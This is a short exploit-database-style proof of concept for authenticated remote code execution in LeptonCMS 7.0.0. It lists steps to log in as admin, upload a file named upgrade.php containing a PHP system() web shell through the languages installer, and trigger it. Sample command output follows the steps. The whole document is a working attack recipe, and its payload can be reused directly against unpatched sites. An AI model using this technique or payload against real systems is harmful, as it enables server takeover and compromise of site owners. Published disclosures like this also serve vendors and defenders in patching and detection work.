## Exploit Title: LeptonCMS : 7.0.0  Remote Code Execution
### Date: 2024-1-19
### Exploit Author: tmrswrr
### Category: Webapps
### Vendor Homepage: https://www.lepton-cms.com/
### Version : 7.0.0
### Tested on: https://www.softaculous.com/apps/cms/LEPTON

1 ) Login with admin cred   >  https://127.0.0.1/LEPTON/backend/login/index.php
2 ) Go to Languages place   > https://127.0.0.1/LEPTON/backend/languages/index.php
3 ) Upload upgrade.php file in languages place > <?php echo system('id'); ?>
4 ) After click install you will be see result

### Result :  uid=1000(lepton) gid=1000(lepton) groups=1000(lepton) uid=1000(lepton) gid=1000(lepton) groups=1000(lepton)
